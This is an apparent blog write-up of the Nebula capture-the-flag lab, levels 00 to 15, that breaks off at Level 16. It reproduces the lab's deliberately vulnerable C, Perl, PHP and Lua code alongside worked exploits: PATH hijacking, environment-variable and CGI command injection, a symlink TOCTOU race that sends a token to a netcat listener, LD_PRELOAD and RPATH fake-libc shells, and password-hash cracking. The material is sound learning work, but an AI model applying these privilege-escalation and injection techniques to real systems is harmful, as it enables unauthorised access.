---
title: "Nebula CTF"
excerpt_separator: "<!--more-->"
categories:
  - CTF
---

![center-aligned-image](https://cdn.pixabay.com/photo/2017/09/12/11/56/universe-2742113_1280.jpg){: .align-center}

CTF by **Andrew Griffiths** @ [https://exploit.education/nebula/](https://exploit.education/nebula/)
{: .notice--info}

This Capture the Flag introduces sysadmin Linux concepts. There will be SUID fils, permissions, race conditions and other topics.
I guess I will be googling most of that and do my best to keep track of the steps, and see to get help from the ones that are much better at me in these topics.

<!--more-->

| Content: | 
|---------------------|----------------------|-----------------------|-----------------------|-----------------------|-----------------------|
| [Install](#install) |	[Level00](#level-00) |	[Level01](#level-01) |	[Level02](#level-02) |	[Level03](#level-03) |	[Level04](#level-04) |
|---------------------|---------------------|-----------------------|-----------------------|-----------------------|-----------------------|
| [Level05](#level-05) | [Level06](#level-06) |	[Level07](#level-07) |	[Level08](#level-08) |	[Level09](#level-09) |	[Level10](#level-10) |
|---------------------|---------------------|-----------------------|-----------------------|-----------------------|-----------------------|
| [Level11](#level-11) |	[Level12](#level-12) |	[Level13](#level-13) |	[Level14](#level-14) |	[Level15](#level-15) |	[Level16](#level-16) |
|---------------------|---------------------|-----------------------|-----------------------|-----------------------|-----------------------|
| [Level17](#level-17) |	[Level18](#level-18) |	[Level19](#level-19) |		                |                       |                       |
|---------------------|---------------------|-----------------------|-----------------------|-----------------------|-----------------------|


# Capture the Flag

### [Install]
The CTF is downloadable as ISO image, and needs to be mounted. \
To mount it use VirtualBox (or VMware or similar) and create an Ubuntu machine, then pass the iso as bootable media. \
For each level, access the machine with the given credentials, where XX corresponds to the target level:

    ```
    User: "levelXX"
    Password: "levelXX"
    ```

To access, retrieve the IP of the CTF machine, for example with the `ip a` command. \
Then connect to the machine with SSH, using the credentials and the command `ssh levelXX@[ipaddr]` \
If you want to install anything in the VM, you can login with the `nebula:nebula` credentials. 

### [Level 00]
This level requires to find a Set User ID program that will run as the “flag00” account.

> SUID (Set owner User ID): is a special type of permission give to a file. Usually then a program runs it gets the permissions from the current user. SUID instead temporarily gives the permissions of the file owner instead that of the user actually running the file. The user will get the permissions of the file owner, together with the UID and GID of the owner. 

> Permissions are given in triplets of rwx (read, write execute) values, and the additional s value for the SUID case.
> The first rwx triplet represent permission for the owner, the second triplet permission for the group and the third triplet permission for the other use of the file. 

1. The hint says that it is possible to search for the file that we are interested in. \
We know the flag has to be executable and we know that its owner is the user flag00, so we use the `find` command, using the `/` to start looking at the root folder, the `-execute` parameter to return only executable files and the `-user` parameter to return only the files owned by the given user.

    ```bash
    find / -execute -user flag00
    ```

2. The search will return a lot of files, most of them with denied permission (we could have prevented this by adding `2>/dev/null` at the end of the find command). \
Among this list there are two for which it seems we have permissions: `/home/flag00` and `/bin/.../flag00`. We inspect them with the command `ls -l`

    ```bash
    drwxr-x--- /home/flag00
    -rwsr-x--- /bin/.../flag00
    ```

3. The permissions of the retrieved files show how `/bin/.../flag00` has the SUID flag and is a file that we can execute. \
After running it, we are told to execute the `getflag` command, which results in successfully getting the flag.

    ```bash
    ./bin/.../flag00
    getflag
    ```

### [Level 01]
There is a vulnerability in the code stored in /home/flag01 that allows arbitrary programs to be executed

```c
int main(int argc, char **argv, char **envp){
    gid_t gid;
    uid_t uid;
    gid = getegid();
    uid = geteuid();

    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);

    system("/usr/bin/env echo and now what?");
}
```

> int system(const char *command): the C library function system() takes as parameter a string containing the name of a requested variable. This variable, that can be a command or program name, is passed to the host environment to be executed. The function returns after the command has been completed. 

> env: it's a linux command to show the environment or run a program in a modified environment. The program to be run (or the path to it) can be passed as an argument. 

1. The interesting part in the code is the call to the `echo` method using the `system()` function. The given path points to the `env` command, which runs the `echo` command, which in turn is retrieved from the system variable `PATH`.
2. By changing what is in `PATH` we can control what will be invoked by the `system()` call. To do this we prepend our own folder to `PATH`. We use the `/tmp` folder, which is already existing in root.

    ```bash
    export PATH=/tmp:$PATH
    echo $PATH # to check if the previous command worked
    ```

3. In the `/tmp` folder we can now create a shell script that launches bash. To do this, we `echo -e` (the -e option is to enable the correct backslash interpretation) the content of our script to the file we need. This file will be named `echo` so that it will be correctly executed by the calling program. Then we take care of making it executable.

    ```bash
    echo -e '#!/bin/bash\n/bin/bash' > /tmp/echo
    chmod +x /tmp/echo
    ```

4. The permissions of the flag01 program has the SUID set, therefore whatever will be invoked by the program will have the permission of the owner, resulting in escalated permissions for us. We run flag01, and we are told to execute the `getflag` command, which results in successfully getting the flag.

    ```bash
    ./flag01 # remember to execute from the correct folder
    getflag
    ```

### [Level 02]
There is a vulnerability in the code stored in /home/flag02 that allows arbitrary programs to be executed

```c
int main(int argc, char **argv, char **envp){
    char *buffer;

    gid_t gid;
    uid_t uid;

    gid = getegid();
    uid = geteuid();

    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);

    buffer = NULL;

    asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
    printf("about to call system(\"%s\")\n", buffer);
    
    system(buffer);
}
```

> int asprintf(char **strp, const char *fmt, ...): the C library function asprintf() is a print method that takes care of allocation: it calculates the length of the string, allocates that amount of memory, and writes the string into it. The pointer to this allocated memory is returned via the first argument, while the second argument is the string to be printed.
> This is different from printf, that prints to the standard output instead that to a memory location, and from sprintf, that prints to a memory location but without caring about the length of the string and the available space. 

> char *getenv(const char *name): the C library function getenv() searches for the environment string pointed to by the parameter and returns the associated value. 

1. Similarly to what happened in level01, we will call the `system()` method to run a command, but instead of passing directly a path we will pass a pointer to a string containing the path. This string will echo a variable from the environment, and that's what we want to modify.
2. We modify the variable `USER` so that it completes the previous command and appends the new ones to be executed. In particular, we want to append a command to open a bash terminal. Appending commands can be done using `&&`. We make sure to finish the new command with an invocation to `echo` so that the following text will not be interpreted as parameter to the shell invocation and break the command.

    ```bash
    export USER=" && /bin/bash && echo"
    ```

3. The permissions of the flag02 program has the SUID set, therefore whatever will be invoked by the program will have the permission of the owner, resulting in escalated permissions for us. We run flag02, and impersonating the new user we run the `getflag` command, which results in successfully getting the flag.

    ```bash
    ./flag02 # remember to execute from the correct folder
    getflag
    ```

### [Level 03]
There are files in /home/flag03, and a crontab called every couple of minutes.

> Crontab: with this command it is possible to plan the automatic periodic execution of other commands. To do this, a daemon is constantly running in the background and checking (once per minute) the registered command. If the commands reached their timeout, they will be executed and the timeout reset.
>    
> The command has the following structure:
>    `m h d M w command`
> The mhdMw fields specify when and how often a command should be executed:
>
>        m: minute (0 - 59)
>        h: hour (0 - 23)
>        d: day of the month (1 - 31)
>        M: month (1 - 12)
>        w: day of the week (0 - 6, Sunday = 0)
>
>    Each field can contain more than a value: a list can be given using a comma `,`, an interval using a dash `-`. The star `*` means every value possible for that field. Whenever the values are true, the command will be executed. 

1. We look at the files in the /home/flag03 folder. There is an empty subfolder and a shell script that when called will run all scripts that are stored in the currently empty folder with the command `ulimit -t 5; bash -x "$i"`, and then delete the finished script with `rm -f "$i"`.
2. To check if the crontab will give the SUID permissions to the scripts in the target folder, we can create a script that will return different values depending on the running permissions. This is what we want to echo in our output file:

    ```bash
    #!/bin/bash
    if [ "$EUID" -ne 0]
        then echo "Please root me!"
        else echo "I am GROOT!"
        exit
    fi
    >> /tmp/root
    ```

3. After the cronjob run, we can check the result in `/tmp/root`. The result will depend on the effective user running the script, corresponding to `$EUID`. If `$EUID` is root, its value will be 0, therefore our file will contain "I am GROOT!". This is indeed what is in our output file, and with this we know that the scripts are really run with SUID.
4. We know our script will run with elevated permissions. Therefore we want to call our getflag command from there. First of all we need to know where that command is, using `whereis getflag`
5. We create the script: it will call the getflag command and store the output in a file, as a proof that we got the flag.

    ```bash
    echo -e '#!/bin/bash\n/bin/getflag >> /tmp/flag' > script.sh
    ```

6. Now we have to wait for the crontab to execute the writable.sh script, which in turn will execute our own script. After the needed time, we can look in our output file for the flag: `cat /tmp/flag`

### [Level 04]
Read the token file bypassing the restrictions in the code.

```c
int main(int argc, char **argv, char **envp){
    char buf[1024];
    int fd, rc;

    if(argc == 1) {
        printf("%s [file to read]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    if(strstr(argv[1], "token") != NULL) {
        printf("You may not access '%s'\n", argv[1]);
        exit(EXIT_FAILURE);
    }

    fd = open(argv[1], O_RDONLY);
    if(fd == -1) {
        err(EXIT_FAILURE, "Unable to open %s", argv[1]);
    }

    rc = read(fd, buf, sizeof(buf));
    
    if(rc == -1) {
        err(EXIT_FAILURE, "Unable to read fd %d", fd);
    }

    write(1, buf, rc);
}
```

> char *strstr(const char *str1, const char *str2): the function returns a pointer to the first occurrence of str2 in str1, or a null pointer if str2 is not part of str1. The matching process does not include the terminating null-characters, but it stops there. 

> Symlink: this file is not just a shortcut pointing to another file, but is a low level pointer written into the file system. This means that it looks like the pointed file is actually there, even if after clicking you will be redirected. The default permissions for a symbolic link are 777, as if it were a folder. 

1. The code takes a parameter containing the path to the file to read, and if the path contains the string "token" it will block us. The file itself has no reading permissions, so we can't go around it using cat or tail. Also, the `strstr()`` method doesn't seem to have any vulnerability.
2. We have to find a way to change the name of the file, and symlinks give us the right opportunity. We can create the link with a different name in a different path where we have rw permissions
    ```bash
    ln -s /home/flag04/token /tmp/readme
    ```

3. Now we can let the flag04 program run on our new link, and as there is no "token" in the new path we will not be blocked. The result is an alphanumerical string
4. The string doesn't look like ASCII, nor like Base64. We try to use it as password to gain access to a user with higher privileges, in this case flag04: `su -l flag04`
5. We are now logged in as flag04 and can execute the `getflag` command

### [Level 05]
Find interesting files in the flag05 folder.

> tar: archiving utility, often combined explicitly with compressions like gzip (.tar.gz) or bzip (.tar.bz). To extract an archive in a target folder use tar -xf source.tar -C folder, or tar xzf source.tar.gz if compressed with gzip. To list the contents of a tar file use tar tvf source.tar 

1. We can list the content of the flag05 folder with the `ls -R` command. What we find is a tar archive in the backup folder.
2. We look at what is in that archive, using tar `tvf backup-19072011.tgz`. It seems that it contains ssh keys and authorized keys.
3. We want to decompress the archive, but the backup folder doesn't have write permissions. So we use the `/tmp` folder as output path

    ```bash
    tar -xf backup-19072011.tgz -C /tmp/
    ```
    
4. We assume that the key is the one used to ssh into the VM with higher privileges, like with the user flag05, without needing a password. Therefore we use ssh to connect to 127.0.0.1 (which corresponds to localhost) passing the key with parameter -i

    ```bash
    ssh -i /tmp/.ssh/id_rsa flag05@127.0.0.1
    ```
5. We are now in the VM with higher privileges, and can execute getflag

### [Level 06]
The flag06 account credentials came from a legacy unix system.

> /etc/passwd: this text file stores login information about each user in the system. There is one line for each user, and each entry is made by seven values separated by columns.
>
>        Username: used when user logs in.
>        Password: an x character indicates that encrypted password is stored in /etc/shadow file.
>        User ID: UID 0 is reserved for root; UIDs 1-99 are reserved for other predefined accounts; UID 100-999 are reserved by system for administrative and system accounts/groups.
>        Group ID: the primary group ID (stored in /etc/group file)
>        User ID Info: comment field.
>        Home directory: absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
>        Command/shell: The absolute path of a command or shell (tipically /bin/bash).
>
>    In old operating systems the password was stored directly in this file. Nowadays it is not anymore 

>    /etc/shadow: a text file where actual passwords (and additional informations) are stored in encrypted format. As in /etc/passwd, there is one entry per each user, one per line.
>
>        Username : login name.
>        Password : encrypted password. Usual format is $id$salt$hashed, where the $id is the algorithm used On GNU/Linux as follows:
>            $1$ is MD5
>            $2a$ is Blowfish
>            $2y$ is Blowfish
>            $5$ is SHA-256
>            $6$ is SHA-512
>        Lastchanged: days since Jan 1, 1970 that password was last changed
>        Minimum : the number of days left before the user is allowed to change password
>        Maximum : the maximum number of days the password is valid, after that user is forced to change password
>        Warn : the number of days before password is to expire that user is warned to change password
>        Inactive : the number of days after password expires that account is disabled
>        Expire : days since Jan 1, 1970 that account is disabled

1. The mention of an old systems clearly hints at the `/etc/passwd` file. We can take a look at it with the following command (we use `grep` to just get the infos about a the specific account): `grep flag06 /etc/passwd`
2. We get a line that looks like it contains the password. However, trying `su -u flag06` with it will not work.
3. The reason it does not work is that the password is encrypted. To decrypt it we can use an utility like John the Ripper. In this case the usage is really simple, as it is enough to save the string "flag06:ueqwOCnSGdsuM" to a file and pass the path to that file to john.
4. John answers almost immediately, giving the password that can now be used for the `su` command to become user flag06 and execute `getflag`

### [Level 07]
Perl program allowing to ping to check for reachability from a webserver.

```perl
#!/usr/bin/perl
use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
    $host = $_[0];

    print("Ping results");

    @output = `ping -c 3 $host 2>&1`;
    foreach $line (@output) { print "$line"; }
}

# check if Host set. if not, display normal page, etc
ping(param("Host"));
```

1. Even without knowing Perl, it is clear that there is a possibility to inject stuff where the `ping` command is created by modifying the `$host` parameter. Also, the challenge description says that the file is served through a webserver, and in the flag07 folder we find a `thttpd.conf` file indicating that the used port is 7007 (just grep for "port" on that file). The file can be executed also locally with `./index.cgi Host=127.0.0.1`
2. We can inject commands by appending them after the IP to ping (or also by omitting the IP): `./index.cgi Host=; ls -asl`. However, injecting directly `getflag` doesn't work because the permission is still for the current user.
3. What we can assume is that only if we send the command through the server it will run with the proper permissions to retrieve our flag. We could do that using wget, which just needs the address as parameter. We want to pass the Host as a GET parameter in the URL (remember URL encoding), so this is our command: `wget http://127.0.0.1:7007/index.cgi?Host=%3Bgetflag`.
5. Note that you could do this also from the browser of your host, just remember to put the proper IP in the address.

### [Level 08]
World readable files strike again. Check what that user was up to, and use it to log into flag08 account.

1. In the flag08 folder we see there is a pcap file. That's a file format used to store network captures, and it can be opened using WireShark.
2. The first thing we do is copy the file to a local folder in our host system, executing from the host `scp level08@[[the VM IP address]]:/home/flag08/capture.pcap flag08.pcap .`
3. Opening the file with WireShark we can see that there are only two machines communicating, and by right-clicking on a packet we can follow the TCP stream. Within this stream we see a line saying `Password: backdoor...00Rm8.ate`.
4. The dots that are part of the password looks odd, so we switch to hex view. With this view we can see that the dots correspond to hex values 0x7F, which in ASCII translates to backspace. This means that the user wrote "backdoor", deleted the last three characters, then wrote "00Rm8", deleted the last character and wrote "ate".
5. Following the typing and deleting, we can reconstruct the password that allows us to log in t as flag08 and run `getflag`

### [Level 09]
C setuid wrapper for vulnerable PHP code.

```c
function spam($email){
    $email = preg_replace("/\./", " dot ", $email);
    $email = preg_replace("/@/", " AT ", $email);
    
    return $email;
}

function markup($filename, $use_me){
    $contents = file_get_contents($filename);

    $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
    $contents = preg_replace("/\[/", "<", $contents);
    $contents = preg_replace("/\]/", ">", $contents);

    return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;
```

> string file_get_contents(string $filename): reads entire file into a string, and returns the file in a string, starting at the specified offset up to maxlen bytes. On failure, it will return FALSE. 

> mixed preg_replace(mixed $pattern, mixed $replacement, mixed $subject): performs a search&replace based on a regular expression. When the pattern is matched, it is replaced. When the first parameter ends with "/e", the second is evaluated as a PHP expression instead than like a simple regex. 

1. The `markup()` function reads the content of a file passed as first argument, and looks for strings of the form "[email name@domain.com]". These strings are passed to the `spam()` method, that substitutes every "@" with "AT" and every "." with "dot".
2. We have to find a way to inject a command rather than an email, and to make it execute. The PHP syntax has to be found with a bit of trial and error, but it turns out that something like `email {${phpinfo()}}]` will execute the `phpinfo` method properly when invoked with `./flag09 /tmp/email use_me`. Remember to save that into the `/tmp/email` file.
3. We can't pass directly `system("getflag"())` as email address, because all the quotes will be escaped. It is the right moment to improvise and pick the hint that is in the method declaration: we try to pass the second argument and see what happens. This time we set the file as `"[email $use_me]"`, so that it will be interpreted as variable. If we execute that, whatever we pass as second argument will be reflected to us.
4. So what we want to do is pass the `system()` call as the `phpinfo` attempt so that it gets executed, and the argument to that will be our `$use_me` variable that we can set to be `getflag`: the mail file is `email {${system($use_me)}}]`, and the execution is `./flag09 /tmp/email getflag`


### [Level 10]
The binary uploads any file, as long as it meets the requirements of the access() system call.

```c
int main(int argc, char **argv){
    char *file;
    char *host;

    if(argc < 3) {
        printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
        exit(1);
    }

    file = argv[1];
    host = argv[2];

    if(access(argv[1], R_OK) == 0) {
        int fd;
        int ffd;
        int rc;
        struct sockaddr_in sin;
        char buffer[4096];

        printf("Connecting to %s:18211 .. ", host); fflush(stdout);

        fd = socket(AF_INET, SOCK_STREAM, 0);

        memset(&sin, 0, sizeof(struct sockaddr_in));
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = inet_addr(host);
        sin.sin_port = htons(18211);

        if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
            printf("Unable to connect to host %s\n", host);
            exit(EXIT_FAILURE);
        }

#define HITHERE ".oO Oo.\n"
        if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
            printf("Unable to write banner to host %s\n", host);
            exit(EXIT_FAILURE);
        }
#undef HITHERE

        printf("Connected!\nSending file .. "); fflush(stdout);

        ffd = open(file, O_RDONLY);
        if(ffd == -1) {
            printf("Damn. Unable to open file\n");
            exit(EXIT_FAILURE);
        }

        rc = read(ffd, buffer, sizeof(buffer));
        if(rc == -1) {
            printf("Unable to read from file: %s\n", strerror(errno));
            exit(EXIT_FAILURE);
        }

        write(fd, buffer, rc);
        printf("wrote file!\n");

    } else {
        printf("You don't have access to %s\n", file);
    }
}
```

> int access(const char *pathname, int mode): check real user's permissions for a file, or whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced. The check uses the calling process's real UID and GID, rather than the effective IDs. On success it returns 0, on error -1 is returned, and errno is set appropriately. 

> TOCTOU bug: time of check to time of use is an example of race conditions caused by changes in a system between the checking of a condition (such as a security credential) and the use of the results of that check. 

> Race condition: this is a class of bugs that might happen when the output of a certain function depends on the order or timing of other uncontrollable events. This kind of problem arise often in multithreaded programming. 

> Netcat: invoked also with the simple command nc, Netcat is a networking tool for reading from and writing to connections using TCP or UDP. As in Level10, we can use it as a listener waiting for incoming connections. 

1. This program takes a file and sends it to a specified IP address. We can test this by opening a netcat listener in our host machine with `nc -l 18211` (the port is specified in the C code) and from the VM sending a file to it with `./flag10 /tmp/ncTest [IP of the host]`. In the host we will see a little header and the content of our test file.
2. Similarly to Level04, we have to provide a file that passes the checks. However, it is not a check made on the name but on the actual permissions of a file. What is interesting to note is that while `access()` uses the real UID, `open()` still uses the effective UID, which in our case will contain SUID. This is a case of TOCTOU bug that we can exploit.
3. To exploit the bug we have to create a race condition. To do this we create a loop that constantly swaps the real file with a fake file using symlinks: by executing the flag10 program multiple times we hope that at some point we will be lucky and run it with the perfect timing so that the `access()` tests the real file and the `open()` gets the swapped file. We create the loop in a bash file:

    ```bash
    #!/bin/bash
    while true
    do
        ln -sf /home/flag10/token /tmp/swaptok
        ln -sf /tmp/ncTest /tmp/swaptok
    done
    ```

4. We run this file with ``./loop.sh &`, where the & is needed to put the job in the background so that we can run something else in the meantime. In our host we start netcat again, this time using the -k flag so that it will keep listening: `nc -lk 18211`.
5. The last step is to run flag10 multiple times passing our symlink to it, until we manage to trigger the race condition. To do this, we use an inline loop (using a script form tmp folder would not work because we don't have read access): `while true; do ./flag10 /tmp/swaptok [IP of the host]; done;`
6. On the host machine we see that netcat is receiving a lot of things, and among them there is a weird-looking string. This string is generated when we manage to trigger the race condition properly, and as in one of the previous challenges, we can use it as password to `su` to the flag10 account, and from there execute `getflag`

### [Level 11]
A binary processes standard input and executes a shell command.

```c
//Return a random, non predictable file, and return the file descriptor for it.
int getrand(char **path){
    char *tmp;
    int pid;
    int fd;

    srandom(time(NULL));

    tmp = getenv("TEMP");
    pid = getpid();
    
    asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
        'A' + (random() % 26), '0' + (random() % 10),
        'a' + (random() % 26), 'A' + (random() % 26),
        '0' + (random() % 10), 'a' + (random() % 26));

    fd = open(*path, O_CREAT|O_RDWR, 0600);
    unlink(*path);
    return fd;
}

void process(char *buffer, int length){
    unsigned int key;
    int i;

    key = length & 0xff;

    for(i = 0; i < length; i++) {
        buffer[i] ^= key;
        key -= buffer[i];
    }

    system(buffer);
}

#define CL "Content-Length: "

int main(int argc, char **argv)
{
    char line[256];
    char buf[1024];
    char *mem;
    int length;
    int fd;
    char *path;

    if(fgets(line, sizeof(line), stdin) == NULL) {
        errx(1, "reading from stdin");
    }

    if(strncmp(line, CL, strlen(CL)) != 0) {
        errx(1, "invalid header");
    }

    length = atoi(line + strlen(CL));
    
    if(length < sizeof(buf)) {
        if(fread(buf, length, 1, stdin) != length) {
            err(1, "fread length");
        }
        process(buf, length);
    } else {
        int blue = length;
        int pink;

        fd = getrand(&path);

        while(blue > 0) {
            printf("blue = %d, length = %d, ", blue, length);

            pink = fread(buf, 1, sizeof(buf), stdin);
            printf("pink = %d\n", pink);

            if(pink <= 0) {
                err(1, "fread fail(blue = %d, length = %d)", blue, length);
            }
            write(fd, buf, pink);
            blue -= pink;
        }    

        mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
        if(mem == MAP_FAILED) {
            err(1, "mmap");
        }
        process(mem, length);
    }
}
```

> File descriptor: an FD is a handle used to access a file or IO resources. It's a non-negative integer (negative values indicate "no value" or an error). Each Unix process (except perhaps a daemon) should expect to have three standard POSIX file descriptors, corresponding to the three standard streams: 0 for standard input, 1 for standard output and 2 for standard error.
> File descriptors index into a per-process table maintained by the kernel, that in turn indexes into a system-wide table of files opened by all processes, called the file table. This table records the mode with which the file has been opened: for reading, writing, appending, and possibly other modes. It also indexes into a third table called the inode table that describes the actual underlying files. To perform input or output, the process passes the file descriptor to the kernel through a system call, and the kernel will access the file on behalf of the process. The process does not have direct access to the file or inode tables.
> On Linux, the set of file descriptors open in a process can be accessed under the path /proc/PID/fd/, where PID is the process identifier. 

> size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream): the function reads nmemb elements of data, each size bytes long, from the stream pointed to by stream, storing them at the location given by ptr. It returns the number of items successfully read (not the number of characters). 

1. The code reads from the standard input, checks for “Content-Length: “, reads an integer representing a length and processes it. Then if the length is less than the buf length (1024) fread is called.
2. To access the call to `process()` we have to pass 1 as the CL integer, so that the amount of read characters corresponds to their length. This character is the second input that we will give to the function.
3. After a couple of attempts with inputs like `Content-Length: 1\nX` we see that the result is always a letter (a fixed one for each input) and some hex values. As we are allowed to pass only a single char we can not give a properly null-terminated string, but after some more attempts it shows that the hex values are probably from the uninitialzed portion of the array, and therefore null bytes are not uncommon.
4. Given that the flag11 file has SUID permissions, if we manage to use it to run the `getflag` command it should work properly. To do this, we create a symlink to `/bin/getflag` (we know the location thanks to `whereis`) with the name of a known output. In our case, if we pass "X", we set the symlink with `ln -s /bin/getflag /tmp/Y`. 
5. We have to add this path to the variable `PATH`, so that it will be checked for executables before the proper bin path: `export PATH=/tmp/:$PATH`. To make sure we run the program until we get a properly null terminated line, which will run the command.
6. However, when we manage to execute the command the returned string says that we are not on the proper account. This is due to the fact that there is no call to setresuid/setresgid, meaning that everything will run as the real UID (level11) instead of the effective UID (flag11).
7. In the flag11 folder there is also a .ssh subfolder, which might be useful. If we manage to inject an authorized-key file here, we will have access to the flag11 account. To do this, we try to access the `process()` on the else-branch in the main function. The idea is to take control of the "unpredictable" path that will be created, and to force it to be a file containing our ssh key.
    
At this point, I have to admit I am not entirely sure how this approach works: a nice [writeup by graugans](https://gist.github.com/graugans/88e6f54c862faec8b3d4bf5789ef0dd9) gives the code and explains the idea a bit better, in case you want more details on how to proceed further.

### [Level 12]
There is a backdoor process listening on port 50001.

```c
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 50001))

function hash(password)
    prog = io.popen("echo "..password.." | sha1sum", "r")
    data = prog:read("*all")
    prog:close()

    data = string.sub(data, 1, 40)

    return data
end

while 1 do
    local client = server:accept()
    client:send("Password: ")
    client:settimeout(60)
    local line, err = client:receive()
    if not err then
        print("trying " .. line) -- log from where ;\
        local h = hash(line)

        if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
            client:send("Better luck next time\n");
        else
            client:send("Congrats, your token is 413**CARRIER LOST**\n")
        end
    end

    client:close()
end
```

1. Without knowing how Lua works, it is clear that an injection might happen in the `hash()` method, where the input is passed without sanitization to an instruction that clearly calls a shell command.
2. We can connect to the process using telnet: `telnet 127.0.0.1 50001`. We will be prompted for a password, and this is our opportunity.
3. We have to close the previous running command and run our own, so our password will be ``; /bin/getflag > /tmp/flag12`.
4. The telnet connection will be closed because obviously we gave a wrong password, but if we check the /tmp/flag12 file we can see that our command has been executed properly (this worked because the command executed before the actual password check).

### [Level 13]
A security check that prevents execution if the user invoking it does not match a specific user id.

```c
#define FAKEUID 1000

int main(int argc, char **argv, char **envp){
    int c;
    char token[256];

    if(getuid() != FAKEUID) {
        printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
        printf("The system administrators will be notified of this violation\n");
        exit(EXIT_FAILURE);
    }

    // snip, sorry :)

    printf("your token is %s\n", token);
}
```

> uid_t getuid(void): the function returns the real user ID of the calling process.

> LD_PRELOAD: this is an optional environmental variable containing paths to shared libraries that the loader will load before any other shared library including the C runtime library. Functions from preloaded libraries will be used before others of the same name in later libraries. This enables library functions to be intercepted and replaced. 

1. It is pretty clear that there are not many possibilities to solve this challenge, because we can't go around the code, and it allows no injection. Also, I don't know of any way to modify the UID (and I hope no way actually exists). So we have to modify the behavior of the code.
2. We know that `getuid` is taken from a shared library, and therefore if we define `LD_PRELOAD` we should be able to overwrite it with a function with the same name but a different behavior. To do this we create a `fakelib.c` file with the following code: `int getuid() { return 1000; }`
3. Compile this code using `gcc -shared -fPIC -o /home/level13/fake.so /home/level13/fake.c` (the -shared and -fPIC arguments are for position independent code).
4. We can't run directly the flag13 program just after setting the `LD_PRELOAD` variable, because for security reasons SETUID programs discard that variable. However, in the code there is a snipped part, and it might very well be that that's the part that will print out the token that we need. 5. This means that if we just copy the file (copy will not keep the SUID permission) and execute the copy with our library, we should get the password: `LD_PRELOAD=/tmp/fake.o ./flag13_copy`
6. With the password we can access the flag13 account with `su` and execute `getflag`

### [Level 14]
Encrypting input and writeing it to stdout. An encrypted token is also in home directory.

1. We run the flag14 program with the `-e` parameter, and we see that it reads the standard input and writes a modified output of the same length. 2. Playing around a bit with inputs like "AAAAA" and "11111" shows that the encryption function is quite easy: to each element ASCII decimal value we add its position.

    ```python
    def encr(e):
        r = []
        i = 0
        for c in e:
            r.append(ord(c) + i)
            i = i+1
        for el in r:
            print(chr(el))
    ```

3. To decrypt the text that is in the token file, we need to write the opposite function: instead of adding its position to each element, we subtract it. As we are moving backwards, we have to remember to reverse the resulting output before printing it:

    ```python
    def decr(d):
        r = []
        s = []
        i = len(d)-1
        for c in d[::-1]:
            r.append(ord(c) - i)
            i = i-1
        for el in r[::-1]:
            s.append(chr(el))
        print("".join(s))
    ```
4. It's not the most elegant solution ever, but if we feed the content of the token file to the `decr()` method, the result will be the password for the flag14 user.
5. At this point, it's enough to use `su` to access the account and run `getflag`

### [Level 15]
strace the binary flag15 and see if you spot anything out of the ordinary.

> strace: intercepts and records the system calls which are called by a given process and the signals which are received by a process. The name of each system call, its arguments and its return value are printed on stderr.

> RPATH: this designates the run-time search path hard-coded in the header of an executable file. Dynamic linking loaders use the rpath to find required libraries. This path may override the system default dynamic linking search paths, and is not subject to the SUID restriction like LD_PRELOAD. The content of the variable can be seen with objdump -p [filename] in the dynamic section.

> Relocation table: this table is a list of pointers stored in the executable file. Each entry in the table points to an absolute address in the object code that must be changed when the loader relocates the program so that it will refer to the correct location (for example of a library function). This table can be seen with objdump -R [filename]

1. We are told to run `strace` on flag15, and by doing that we can see that the program is trying to load the library "libc.so.6" from a bunch of locations. This suggests an approach similar to the one of Level13, but the SUID limiation forces us to take another road.
2. From all the data dumped with strace, we can see that one of the locations where the program looks for the library is /var/tmp/flag15. If we look at that folder permissions we can see that it's writable, and a look at the file15 file with `objdump -p` confirms that it's where we should try to put the file. So let's `touch /var/tmp/flag15/libc.so.6` and run the program again (this time without strace).
3. Running the program shows that flag15 found our library, but obviously it's complaining that there is nothing useful in it. Therefore we can find out which methods should be in there and implement one with something useful for us.
4. To do that we can look in the relocation table which functions are needed, using `objdump -R`. From the resulting list, `__libc_start_main` seems like the most promising method: after some googling, it turns out that it's used to call main, meaning that whatever it does will happen as first, reducing the chance of problems.
5. As we did in Level13, we create a `fake.c` file containing a fake implementation of `__libc_start_main`. Remember however to use the proper signature of the function, with the correct arguments and return type. The content of the function should be a call to system() to spawn a shell for us:

    ```c
    int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
        system("/bin/sh");
    }
    ```

6. Then compile the file with `gcc -shared -fPIC -o /var/tmp/flag15/libc.so.6 /tmp/fake15.c` and try running flag15 again.
7. The error that we get this time means two things: that symbol `__cxa_finalize` is undefined, and that we are missing the version of the library. 8. The first problem is solved by inserting an implementation for the `__cxa_finalize` method in our fake library. It doesn't have to do anything, just give it a return statement and that's enough.
9. The second problem requires us to create a version file containing `GLIBC_2.0 {}`. We have now to recompile our library passing the version file: `gcc -shared -fPIC -Wl,--version-script=/tmp/version -o /var/tmp/flag15/libc.so.6 /tmp/fake15.c`
10. Running flag15 now says that system is not defined. We do not want to rewrite its implementation, as we want it to work propely to call getflag. So instead of inserting it in our library, we decide to use static linking, meaning that the function will be copied in our compiled library instead of being accessed invoking an external library. To do this, we use `-Bstatic` and `-static-libgcc` to tell gcc to not link against shared libraries: `gcc -shared -static-libgcc -fPIC -Wl,--version-script=/tmp/version,-Bstatic -o /var/tmp/flag15/libc.so.6 /tmp/fake15.c`
11. Running flag15 again results in a sh session. If we run `whoami` we can see that we are in fact user flag15, and therefore we can run `getflag` successfully.

### [Level 16]
There is a perl script running on port 1616.

```perl
